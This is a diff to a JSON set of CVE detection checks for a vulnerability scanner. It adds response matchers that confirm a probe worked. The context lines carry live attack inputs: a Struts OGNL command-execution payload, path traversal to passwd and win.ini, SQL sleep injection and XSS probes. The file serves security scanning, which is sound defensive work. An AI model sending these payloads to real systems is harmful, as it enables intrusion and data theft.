@@ -5085,7 +5085,26 @@
               "/spaces",
               "/display"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "x-cmd-response:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "confluence"
+              ],
+              "condition": "and"
+            }
+          ],
+          "matchers_condition": "or"
         },
         {
           "id": "cve_citrix_19781",
@@ -5642,7 +5661,24 @@
             "powered_by": [
               "gitlab"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "path_with_namespace"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_21858",
@@ -5691,7 +5727,27 @@
             "path_contains": [
               "models"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "\"models\":[",
+                "This API is restricted",
+                "models",
+                "restricted"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_27944",
@@ -5749,7 +5805,24 @@
             "path_contains": [
               "openam"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "jato.pageSession"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_39339",
@@ -5851,7 +5924,37 @@
             "path_contains": [
               "importer"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "importer",
+                "phpvms"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Database Config",
+                "Import Configuration",
+                "Start Importer",
+                "WIPE OUT YOUR EXISTING DATA",
+                "importer/config"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_42647",
@@ -5870,7 +5973,24 @@
             "powered_by": [
               "wordpress"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "<loc>"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_44262",
@@ -5975,7 +6095,16 @@
             "powered_by": [
               "gitea"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_6875",
@@ -6020,7 +6149,16 @@
             "path_contains": [
               "unauth"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_0282",
@@ -6100,7 +6238,26 @@
               "nmc",
               "rpc"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "LOG_SYSTEM:",
+                "server_main_impl",
+                "upnp_ini_file"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_24893",
@@ -6160,7 +6317,24 @@
               "geoserver",
               "wfs"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "wfs:WFS_Capabilities"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_32429",
@@ -6177,7 +6351,27 @@
               "xwiki",
               "rest"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Exception",
+                "HqlQueryScriptService",
+                "org.xwiki.livedata.LiveDataException",
+                "text/javascript"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_34299",
@@ -6193,7 +6387,24 @@
             "path_contains": [
               "mftp"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "MonstaFTP"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_40551",
@@ -6240,7 +6451,24 @@
             "path_contains": [
               "de2api"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "token is empty"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                401
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_49132",
@@ -6435,7 +6663,32 @@
             "powered_by": [
               "wordpress"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Essential Blocks – Page"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_6750",
@@ -6898,7 +7151,25 @@
             "powered_by": [
               "vmware"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "logInsight",
+                "releaseName\":"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2022_4060",
@@ -7769,7 +8040,26 @@
             "powered_by": [
               "wordpress"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "DB_NAME",
+                "DB_PASSWORD",
+                "DB_USER"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2018_13379",
@@ -7936,7 +8226,23 @@
               "jboss",
               "java"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "j_security_check",
+                "jboss",
+                "jboss.deployment",
+                "jboss.system",
+                "jmx agent",
+                "jmx-console"
+              ],
+              "condition": "or"
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2010_5286",
@@ -8018,7 +8324,25 @@
             "powered_by": [
               "django"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "PostgreSQL",
+                "invalid input syntax for type integer"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_22739",
@@ -8070,7 +8394,18 @@
             "server": [
               "apache"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Apache Druid"
+              ],
+              "condition": "and"
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2025_34031",
@@ -8131,7 +8466,24 @@
             "powered_by": [
               "nexus"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_26255",
@@ -9730,7 +10082,27 @@
             "server": [
               "apache"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "mbean\":",
+                "org.apache.activemq",
+                "request\":{",
+                "type=Broker"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2024_38816",
@@ -9945,7 +10317,25 @@
           "body": "action=lkn_pix_for_woocommerce_generate_nonce&action_name=lkn_pix_for_woocommerce_c6_settings_nonce",
           "headers": {
             "Content-Type": "application/x-www-form-urlencoded"
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "\"success\":true",
+                "success"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2026_40887",
@@ -12161,7 +12551,24 @@
               "addressbook.php",
               "%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "squirrelmail"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2005_3344",
@@ -14231,7 +14638,26 @@
               "tools.php",
               "content"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "title",
+                "wp:author_email",
+                "wp:author_id"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2015_2794",
@@ -14731,7 +15157,24 @@
               "themes",
               "Newspaper"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Newspaper"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2016_2389",
@@ -14963,7 +15406,40 @@
               "META-INF",
               "%c0%ae%c0%ae"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "bit app support",
+                "extensions",
+                "fonts"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "or"
         },
         {
           "id": "nuclei_cve_2017_1000029",
@@ -15585,7 +16061,24 @@
               "current_config",
               "passwd"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "id:name:passwd"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2017_8225",
@@ -16019,7 +16512,26 @@
               "passwd%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27",
               "c%27%2C%23cmd%7D%3A%7B%27bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:",
+                "root:.*:0:0:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                302
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2018_12031",
@@ -17709,7 +18221,16 @@
             "path_contains": [
               "/admin"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2019_13462",
@@ -17885,7 +18406,18 @@
               "plugins",
               "meta-box"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Meta Box"
+              ],
+              "condition": "and"
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2019_15858",
@@ -17999,7 +18531,26 @@
               "f_type",
               "f_username"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "gid=",
+                "pwd&id",
+                "uid="
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2019_16123",
@@ -18333,7 +18884,32 @@
               "host",
               "oast.fun"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Interactsh Server"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "image/x-icon"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2019_18665",
@@ -18417,7 +18993,24 @@
             "path_contains": [
               "config.dat"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "bytes"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2019_20085",
@@ -19078,7 +19671,24 @@
               "plugins",
               "seo-by-rank-math"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Rank Math"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2020_11732",
@@ -19099,7 +19709,24 @@
               "plugins",
               "media-library-assistant"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "// Silence is golden."
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2020_11738",
@@ -21072,7 +21699,26 @@
             "path_contains": [
               "settings"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "indexer.settings",
+                "max_seckey_size",
+                "projector.settings"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2020_9047",
@@ -21241,7 +21887,32 @@
             "path_contains": [
               "login.html"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "logonTitle\">Email Security Login"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "Apache-Coyote/1.1"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2021_20086",
@@ -21259,7 +21930,24 @@
               "%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E",
               "__proto__%5Bjquery%5D"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "debug:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2021_20114",
@@ -21401,7 +22089,40 @@
               "view",
               "filename"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "bit app support",
+                "extensions",
+                "fonts"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "or"
         },
         {
           "id": "nuclei_cve_2021_21246",
@@ -21582,7 +22303,24 @@
               "plugins",
               "the-plus-addons-for-elementor-page-builder"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "The Plus Addons for Elementor"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2021_24227",
@@ -21641,7 +22379,24 @@
               "plugins",
               "qubely"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Qubely"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2021_25864",
@@ -21958,7 +22713,25 @@
             "path_contains": [
               "dl.asp"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "<title>Download Agent</title>",
+                "mkDefault.asp?id="
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2021_3017",
@@ -22681,7 +23454,33 @@
               "DownloadExcelFile",
               "Domain_Credential_Report_Excel"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "<?xml version="
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "application/vnd.openxml",
+                "attachment; filename="
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2021_39316",
@@ -23019,7 +23818,39 @@
               "__proto__[polluted]",
               "polluted"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "aurelia-path",
+                "parseQueryString"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "1.1.0",
+                "1.1.1",
+                "1.1.2",
+                "1.1.3",
+                "1.1.4",
+                "1.1.5",
+                "1.1.6"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2021_41277",
@@ -23541,7 +24372,27 @@
             "path_contains": [
               "live_mfg.html"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Brand=",
+                "FW_Version=",
+                "LAN_MAC=",
+                "Model="
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2021_44427",
@@ -23701,7 +24552,25 @@
               "cwp_theme",
               "original"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "control webpanel",
+                "cwp | user"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2021_46104",
@@ -24758,7 +25627,33 @@
               "%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c",
               "passwd"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "[fonts]",
+                "for 16-bit app support"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2022_27593",
@@ -25476,7 +26371,26 @@
             "path_contains": [
               "moduleInformation"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "cloudHost\":",
+                "name\":",
+                "remoteAddresses"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2022_36642",
@@ -25743,7 +26657,24 @@
             "path_contains": [
               "pentaho"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Pentaho User Console - Login"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2022_45269",
@@ -25840,7 +26771,33 @@
             "path_contains": [
               "ExportReportingManager.aspx"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "EmployeeCode",
+                "EmployeeName"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "application/CSV"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2022_47945",
@@ -25976,7 +26933,24 @@
             "path_contains": [
               "fp-content"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "<title>Index of /fp-content</title>"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_1719",
@@ -26066,7 +27040,24 @@
               "view_details.php",
               "1'+AND+(SELECT+9687+FROM+(SELECT(SLEEP(6)))pnac)+AND+'ARHJ'"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Supplier Name"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_22047",
@@ -26171,7 +27162,32 @@
               "root",
               "D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "TRACKID="
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_23492",
@@ -26322,7 +27338,16 @@
               "fonts.php",
               "name"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_2766",
@@ -26340,7 +27365,25 @@
               "backmgr",
               "urlpage"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "sdbpassword =",
+                "sdbuser ="
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_29887",
@@ -26396,7 +27439,24 @@
               "plugins",
               "mstore-api"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "MStore API"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_31059",
@@ -26442,7 +27502,26 @@
           },
           "headers": {
             "Authorization": "x secretkey"
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "\"name\":",
+                "\"network\":",
+                "{\"address\":"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_32117",
@@ -26703,7 +27782,26 @@
               "admins",
               "users"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "name",
+                "results",
+                "userId"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_35082",
@@ -26721,7 +27819,26 @@
               "asfV3",
               "admins"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "name",
+                "results",
+                "userId"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_36144",
@@ -26851,7 +27968,16 @@
               "%22%5d%5d%20%7b%7b%61%73%79%6e%63%20%61%73%79%6e%63%3d%22%74%72%75%65%22%20%63%61%63%68%65%64%3d%22%66%61%6c%73%65%22%20%63%6f%6e%74%65%78%74%3d%22%64%6f%63%2e%72%65%66%65%72%65%6e%63%65%22%7d%7d%7b%7b%70%79%74%68%6f%6e%7d%7d%70%72%69%6e%74%28%33%37%32%34%33%34%38%20%2a%20%38%34%37%33%33%33%34%29%7b%7b%2f%70%79%74%68%6f%6e%7d%7d%7b%7b%2f%61%73%79%6e%63%7d%7d",
               "sheet"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_37474",
@@ -26901,7 +28027,34 @@
             "path_contains": [
               "modules"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Index of /modules"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "asterisk_",
+                "billing_",
+                "issabel"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_3765",
@@ -27007,7 +28160,26 @@
               "mgmnt",
               "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "bit app support",
+                "extensions",
+                "fonts"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_39143",
@@ -27023,7 +28195,24 @@
             "path_contains": [
               "custom-report-example"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "image/png"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_39677",
@@ -27218,7 +28407,26 @@
               "keyword",
               "long"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "api_key",
+                "auth_domain",
+                "google_map_key"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_42344",
@@ -27270,7 +28478,19 @@
             "path_contains": [
               "WebInterface"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "header",
+              "words": [
+                "crushauth",
+                "currentauth"
+              ],
+              "condition": "and"
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_43261",
@@ -27305,7 +28525,26 @@
               "mlflow",
               "experiments"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "artifact_location\":",
+                "experiment_id\":",
+                "lifecycle_stage\":"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "matchers_condition": "and"
         },
         {
           "id": "nuclei_cve_2023_43662",
@@ -27489,7 +28728,24 @@
               "plugins",
               "form-maker"
             ]
-          }
+          },
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Form Maker by 10Web"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
